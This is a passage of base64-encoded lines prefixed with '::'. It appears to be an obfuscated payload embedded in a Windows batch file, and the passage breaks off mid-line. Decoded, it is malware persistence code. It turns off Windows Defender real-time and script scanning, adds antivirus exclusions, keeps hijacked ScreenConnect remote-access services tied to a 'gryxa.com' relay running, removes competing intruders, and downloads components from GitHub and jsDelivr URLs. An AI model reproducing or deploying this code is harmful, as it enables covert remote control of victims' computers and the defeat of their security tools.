::bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiR2V0LUNvbnRl
::bnQgLUxpdGVyYWxQYXRoICclV0QlXG1zaV9oZWFsLmxvZycgLVRhaWwgMTAiID4+
::IiVMT0clIiAyPiYxDQogICkNCiAgaWYgbm90IGRlZmluZWQgTVNJRVhJVCBzZXQg
::Ik1TSUVYSVQ9ZmV0Y2gtZmFpbCINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
::JVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1
::aWxkICVNT05WRVIlIC1FeHRyYSAibXNpLWZhaWxlZCIgPm51bCAyPiYxDQogIGNh
::bGwgOlRnU3RhdGUgRkFJTCAiTVNJIGluc3RhbGwgZmFpbGVkIG9uIGFsbCBzb3Vy
::Y2VzIChtc2lleGVjIGV4aXQgJU1TSUVYSVQlKSINCikgZWxzZSAoDQogIGVjaG8g
::c3ZjIHJlc3RvcmVkPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
::Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVX
::RCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1C
::dWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlc3RvcmVkIiA+bnVsIDI+JjENCiAgY2Fs
::bCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVjdCByZWluc3RhbGxlZCBP
::SyINCikNCg0KOkFmdGVySGVhbA0KcmVtIE0xNjogQUxUIHByZXNlbnQtYnV0LXN0
::b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBhaXItYnktR1VJRCAoZXZlcnkgdGlj
::aykNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+
::bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+
::bnVsDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBhbHQgc3RvcHBlZCAt
::IHJlc3RhcnQvcmVwYWlyPj4iJUxPRyUiDQogICAgbmV0IHN0YXJ0ICJTY3JlZW5D
::b25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCiAgICBzYyBzdGFy
::dCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQog
::ICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgICBzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+
::bnVsDQogICAgaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0ICIlV0QlXG93bl9saWIu
::cHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
::dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
::aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxP
::RyUiIDI+JjENCiAgKQ0KKQ0KcmVtIE0xNzogQUxUIHNlcnZpY2UgZW50cnkgZGVs
::ZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkIC0+IHJlcGFpci1ieS1HVUlEIGV2
::ZXJ5IHRpY2sNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9G
::UCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8gYWx0X21p
::c3NpbmdfdHJ5X3JlcGFpcj4+IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxvd25f
::bGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
::LUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+
::IiVMT0clIiAyPiYxDQopDQpyZW0gKGV4dGVybWluYXRpb24gYWxyZWFkeSByYW4g
::cHJlLWhlYWwgaW4gW0VdOyBmb3JlaWduIHN1cnZpdm9ycyBjb3VudGVkIHRoZXJl
::KQ0KDQpyZW0g4pSA4pSAIFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAocXVpZXQgRGVm
::ZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKUgOKUgA0KcmVtIE0zOS9NNDM6IE1w
::UHJlZmVyZW5jZSB3aGVuIFdpbkRlZmVuZCBhbGl2ZTsgYWx3YXlzIGFsc28gd3Jp
::dGUgcG9saWN5L2V4Y2x1c2lvbiBSRUcNCnJlbSAoSGVsbCBob3N0OiBXaW5EZWZl
::bmQgZGVhZCDihpIgMHg4MDAxMDZiYSwgYnV0IEFNU0kgc3RpbGwgYmxvY2tlZCBQ
::UyDigJQgcmVnICsgb3duX2dyeXhhLmNtZCBjb3ZlciBpdCkNCnJlZyBhZGQgIkhL
::TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJc
::UmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3Jp
::bmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0U2Nhbm5pbmcgL3Qg
::UkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRX
::QVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMi
::IC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBh
::ZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
::bHVzaW9uc1xQYXRocyIgL3YgIiVFVEwlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+
::bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRv
::d3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVTeXN0ZW1Sb290JVxU
::ZW1wXC51cGQiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFk
::ZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNs
::dXNpb25zXFBhdGhzIiAvdiAiJVByb2dyYW1GaWxlcyVcU2NyZWVuQ29ubmVjdCBD
::bGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQg
::IkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
::aW9uc1xQYXRocyIgL3YgIiVQcm9ncmFtRmlsZXMoeDg2KSVcU2NyZWVuQ29ubmVj
::dCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBh
::ZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
::bHVzaW9uc1xQcm9jZXNzZXMiIC92ICJTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZp
::Y2UuZXhlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQg
::IkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
::aW9uc1xQcm9jZXNzZXMiIC92ICJtc2lleGVjLmV4ZSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIkRXJyb3JB
::Y3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsgdHJ5e1NldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWV9Y2F0Y2h7
::fTsgdHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3JpcHRTY2FubmluZyAk
::dHJ1ZX1jYXRjaHt9OyB0cnl7QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0
::aCAnJVdEJScsJyVFVEwlJywoSm9pbi1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzICdT
::Y3JlZW5Db25uZWN0IENsaWVudConKSwoSm9pbi1QYXRoICR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykgLUVycm9yQWN0aW9u
::IFN0b3B9Y2F0Y2h7fTsgZm9yZWFjaCgkeCBpbiBAKCdTY3JlZW5Db25uZWN0LkNs
::aWVudFNlcnZpY2UuZXhlJywnU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4
::ZScsJ21zaWV4ZWMuZXhlJywncG93ZXJzaGVsbC5leGUnKSl7dHJ5e0FkZC1NcFBy
::ZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJHggLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWV9Y2F0Y2h7fX0iID5udWwgMj4mMQ0KDQpyZW0g4pSA4pSAIFtH
::XSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBoIOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFu
::ZCAiaWYoKFRlc3QtUGF0aCAnJVdEJVxvd25fc2VjdXJlLmNtZCcpIC1hbmQgKCgg
::LW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5mbGFnJykpIC1vciAoKChHZXQtRGF0
::ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHNlYy5mbGFnJykuTGFz
::dFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhpdCAxIH0gZWxzZSB7
::IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8g
::cGVyaW9kaWMgcmUtc2VjdXJlPj4iJUxPRyUiDQogIGNhbGwgIiVXRCVcb3duX3Nl
::Y3VyZS5jbWQiID4+IiVMT0clIiAyPiYxDQogIGVjaG8gZG9uZT4iJVdEJVxzZWMu
::ZmxhZyINCikNCg0KcmVtIOKUgOKUgCBbRzJdIEdyeXhhIE1VU1QtUlVOIOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgA0KcmVtIE80MDogaWYgQU5ZIG5vbi1zZXZyeiBTQyBS
::dW5uaW5nIOKGkiBuZXZlciBtc2lleGVjIChzdG9wcyBwYW5lbCBkdXBsaWNhdGVz
::KS4NCnNldCAiR1JZWEFfT0s9MCINCnNldCAiR1JZWEFfV0FTPTAiDQpzZXQgIkRP
::X0RFRVA9MCINCnNldCAiRk9SQ0VfRz0wIg0KaWYgZXhpc3QgIiVXRCVcZ3J5eGEu
::Y2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBp
::biAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQ
::IiBzZXQgIkdSWVhBX0ZQPSUlTCINCg0KcmVtIEZPUkNFIHB1c2g6IGNvbnRlbnQt
::aGFzaCB2aWEgZmMgL2IgKHJlLWZpcmUgd2hlbiBmbGFnIGNvbnRlbnQgY2hhbmdl
::cyk7IHJhdy1maXJzdA0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29u
::bmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVdEJVxmb3JjZV9ncnl4
::YS5uZXciICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVk
::ZHkvZ2l0aHViLWRyb3AvbWFpbi9mb3JjZV9ncnl4YS5mbGFnP3Q9JVJBTkRPTSUl
::UkFORE9NJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcZm9yY2VfZ3J5
::eGEubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRp
::bWUgMjAgLW8gIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiaHR0cHM6Ly9jZG4uanNk
::ZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vZm9yY2VfZ3J5
::eGEuZmxhZz90PSVSQU5ET00lJVJBTkRPTSUiID5udWwgMj4mMQ0KaWYgZXhpc3Qg
::IiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAoDQogIGZpbmRzdHIgL0M6IlBVU0giICIl
::V0QlXGZvcmNlX2dyeXhhLm5ldyIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxl
::dmVsIDEgKA0KICAgIGlmIG5vdCBleGlzdCAiJVdEJVxmb3JjZV9ncnl4YS5kb25l
::IiAoDQogICAgICBzZXQgIkZPUkNFX0c9MSINCiAgICApIGVsc2UgKA0KICAgICAg
::ZmMgL2IgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiJVdEJVxmb3JjZV9ncnl4YS5k
::b25lIiA+bnVsIDI+JjENCiAgICAgIGlmIGVycm9ybGV2ZWwgMSBzZXQgIkZPUkNF
::X0c9MSINCiAgICApDQogICkNCikNCg0KcmVtIERldGVjdCBhbnkgUnVubmluZyBu
::b24tc2V2cnogU2NyZWVuQ29ubmVjdCAodHJ1ZSBHcnl4YSBwcmVzZW5jZSkNCnBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
::bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5
::eGEtaGVhbHRoIC1Xb3JrRGlyICIlV0QlIiA+IiVXRCVcZ3J5eGFfaGVhbHRoLm91
::dCIgMj5udWwNCnNldCAiR0g9Ig0KaWYgZXhpc3QgIiVXRCVcZ3J5eGFfaGVhbHRo
::Lm91dCIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKCIlV0QlXGdy
::eXhhX2hlYWx0aC5vdXQiKSBkbyBzZXQgIkdIPSUlUiINCmVjaG8gZ3J5eGFfaGVh
::bHRoPSFHSCE+PiIlTE9HJSINCmVjaG8gIUdIIXwgZmluZHN0ciAvSSAvQiAvQzoi
::SEVBTFRIWSIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiR1JZ
::WEFfT0s9MSINCiAgc2V0ICJHUllYQV9XQVM9MSINCiAgaWYgZXhpc3QgIiVXRCVc
::Z3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0i
::ICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJS
::RU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCikNCg0KcmVtIEZPUkNFIHB1c2g6
::IHF1ZXVlIEdyeXhhIFJFSU5TVEFMTCAocGFuZWwgd2lwZSkgdGhlbiBhY2sg4oCU
::IGZyZWV6ZSBzdGlsbCBibG9ja3MgZGFpbHkgbXNpZXhlYw0KaWYgIiVGT1JDRV9H
::JSI9PSIxIiAoDQogIGVjaG8gZ3J5eGFfZm9yY2VfcHVzaF9yZWluc3RhbGw+PiIl
::TE9HJSINCiAgY2FsbCA6UXVldWVHcnl4YUhlYWwgUkVJTlNUQUxMDQogIGlmIGV4
::aXN0ICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgY29weSAveSAiJVdEJVxmb3JjZV9n
::cnl4YS5uZXciICIlV0QlXGZvcmNlX2dyeXhhLmRvbmUiID5udWwgMj4mMQ0KICBn
::b3RvIDpHcnl4YUFmdGVyDQopDQoNCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
::SW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKCggLW5vdCAoVGVzdC1QYXRoICclR1JZ
::WEFfREVFUCUnKSkgLW9yICgoKEdldC1EYXRlKS0oR2V0LUl0ZW0gLUxpdGVyYWxQ
::YXRoICclR1JZWEFfREVFUCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxI
::b3VycyAtZ2UgOCkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4m
::MQ0KaWYgZXJyb3JsZXZlbCAxIHNldCAiRE9fREVFUD0xIg0KDQpyZW0gSGVhbHRo
::eSArIG5vdCBkZWVwIGR1ZSDihpIgc3RpbGwgdmVyaWZ5IEltYWdlUGF0aCBoYXMg
::Z3J5eGEuY29tIChiYXJlIHNjIGNyZWF0ZSA9IGZhbHNlIGhlYWx0aHkpDQppZiAi
::IUdSWVhBX09LISI9PSIxIiAoDQogIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3Vy
::cmVudENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVH
::UllYQV9GUCUpIiAvdiBJbWFnZVBhdGggMj5udWwgfCBmaW5kc3RyIC9JICJncnl4
::YS5jb20iID5udWwNCiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBzZXQgIkdSWVhB
::X09LPTAiDQogICAgZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAo
::J3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFN
::RTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKA0KICAgICAgc2V0ICJfRlA9
::JSVhIg0KICAgICAgc2V0ICJfRlA9IV9GUDogPSEiDQogICAgICBpZiAvSSBub3Qg
::IiFfRlAhIj09IiVLRUVQX0ZQJSIgaWYgL0kgbm90ICIhX0ZQISI9PSIlQUxUX0ZQ
::JSIgKA0KICAgICAgICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFf
::RlAhKSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RBUlRfUEVORElO
::RyIgPm51bA0KICAgICAgICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICAgICAg
::ICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZp
::Y2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICghX0ZQISkiIC92IEltYWdlUGF0aCAy
::Pm51bCB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bA0KICAgICAgICAgIGlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICAgICAgc2V0ICJHUllYQV9PSz0x
::Ig0KICAgICAgICAgICAgc2V0ICJHUllYQV9GUD0hX0ZQISINCiAgICAgICAgICAp
::DQogICAgICAgICkNCiAgICAgICkNCiAgICApDQogICAgaWYgIiFHUllYQV9PSyEi
::PT0iMCIgZWNobyBncnl4YV9ydW5uaW5nX25vX3JlbGF5Pj4iJUxPRyUiDQogICkN
::CikNCg0KaWYgIiFHUllYQV9PSyEiPT0iMSIgaWYgIiVET19ERUVQJSI9PSIwIiAo
::DQogIGVjaG8gZ3J5eGFfc2tpcF9hbHJlYWR5X2hlYWx0aHk+PiIlTE9HJSINCiAg
::Z290byA6R3J5eGFBZnRlcg0KKQ0KDQpyZW0gcmVzdG9yZSBsaWIgaWYgQVYvQU1T
::SSBkZWxldGVkIGl0IChjbWQtb25seSkNCmlmIG5vdCBleGlzdCAiJVdEJVxvd25f
::bGliLnBzMSIgKA0KICBlY2hvIGdyeXhhX2xpYl9taXNzaW5nX3JlZmV0Y2g+PiIl
::TE9HJSINCiAgcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlz
::YWJsZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4m
::MQ0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCiAgIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tl
::IC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25f
::bGliLnBzMSIgIiVPV05MSUIlIiA+bnVsIDI+JjENCikNCg0KcmVtIE01MiBGUkVF
::WkUgKyBTVFVDSy1IRUFMOiBzdGFydC1vbmx5IHdoZW4gcG9zc2libGU7IHF1ZXVl
::IEc3IGhlYWwgd2hlbiAxMDYwK2RpciBvciBuby1yZWxheQ0KaWYgZXhpc3QgIiVX
::RCVcZ3J5eGFfaW5zdGFsbC5jbWQiIGRlbCAvZiAvcSAiJVdEJVxncnl4YV9pbnN0
::YWxsLmNtZCIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxncnl4YV9tc2kubG9j
::ayIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1D
::b21tYW5kICJpZigoKEdldC1EYXRlKS0oR2V0LUl0ZW0gJyVXRCVcZ3J5eGFfbXNp
::LmxvY2snKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWd0IDI1KXtSZW1v
::dmUtSXRlbSAnJVdEJVxncnl4YV9tc2kubG9jaycgLUZvcmNlfSIgPm51bCAyPiYx
::DQopDQppZiAiIUdSWVhBX09LISI9PSIwIiAoDQogIGVjaG8gZ3J5eGFfbW9uX3N0
::YXJ0X29ubHk+PiIlTE9HJSINCiAgc2MgY29uZmlnICJTY3JlZW5Db25uZWN0IENs
::aWVudCAoJUdSWVhBX0ZQJSkiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0KICBzYyBm
::YWlsdXJlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHJlc2V0
::PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3Rh
::cnQvMzAwMCA+bnVsIDI+JjENCiAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xp
::ZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQogIHRpbWVvdXQgL3QgMTIgL25v
::YnJlYWsgPm51bA0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVH
::UllYQV9GUCUpIiA+bnVsIDI+JjENCiAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5u
::dWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAl
::KSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RBUlRfUEVORElORyIg
::Pm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICByZWcgcXVlcnkgIkhL
::TE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwgZmlu
::ZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQogICAgaWYgbm90IGVycm9ybGV2ZWwg
::MSBzZXQgIkdSWVhBX09LPTEiDQogICkNCiAgcmVtIE01Mzogc2VydmljZSBleGlz
::dHMgU1RPUFBFRCB3aXRoIHJlbGF5IOKGkiBzdGFydC1vbmx5LCBkbyBOT1QgcmVp
::bnN0YWxsDQogIGlmICIhR1JZWEFfT0shIj09IjAiICgNCiAgICBzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAg
::ICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICAgIHJlZyBxdWVyeSAiSEtMTVxT
::WVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCVHUllYQV9GUCUpIiAvdiBJbWFnZVBhdGggMj5udWwgfCBmaW5kc3Ry
::IC9JICJncnl4YS5jb20iID5udWwNCiAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEg
::KA0KICAgICAgICBlY2hvIGdyeXhhX3N0b3BwZWRfcmVsYXlfc3RhcnRfcmV0cnk+
::PiIlTE9HJSINCiAgICAgICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
::ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQogICAgICAgIHRpbWVvdXQgL3QgMTAg
::L25vYnJlYWsgPm51bA0KICAgICAgICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9D
::OiJTVEFSVF9QRU5ESU5HIiA+bnVsDQogICAgICAgIGlmIG5vdCBlcnJvcmxldmVs
::IDEgc2V0ICJHUllYQV9PSz0xIg0KICAgICAgICBpZiAiIUdSWVhBX09LISI9PSIw
::IiBlY2hvIGdyeXhhX3N0b3BwZWRfcmVsYXlfc3RpbGxfZG93bl9ub19oZWFsPj4i
::JUxPRyUiDQogICAgICApDQogICAgKQ0KICApDQogIGlmICIhR1JZWEFfT0shIj09
::IjAiICgNCiAgICBmb3IgL2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGluICgn
::c2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1F
::OiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQogICAgICBzZXQgIl9GUD0l
::JWEiDQogICAgICBzZXQgIl9GUD0hX0ZQOiA9ISINCiAgICAgIGlmIC9JIG5vdCAi
::IV9GUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFfRlAhIj09IiVBTFRfRlAl
::IiAoDQogICAgICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoIV9G
::UCEpIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5H
::IiA+bnVsDQogICAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICAg
::IHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vydmlj
::ZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgL3YgSW1hZ2VQYXRoIDI+
::bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQogICAgICAgICAgaWYg
::bm90IGVycm9ybGV2ZWwgMSAoDQogICAgICAgICAgICBzZXQgIkdSWVhBX09LPTEi
::DQogICAgICAgICAgICBzZXQgIkdSWVhBX0ZQPSFfRlAhIg0KICAgICAgICAgICkN
::CiAgICAgICAgKQ0KICAgICAgKQ0KICAgICkNCiAgKQ0KKQ0KDQpyZW0gaGVhbCBP
::TkxZIG9uIGhhcmQgMTA2MCAoc2VydmljZSBtaXNzaW5nKS4gTmV2ZXIgbXNpZXhl
::YyB3aGlsZSBzdmMgZXhpc3RzLg0Kc2V0ICJORUVEX0hFQUw9MCINCmlmICIhR1JZ
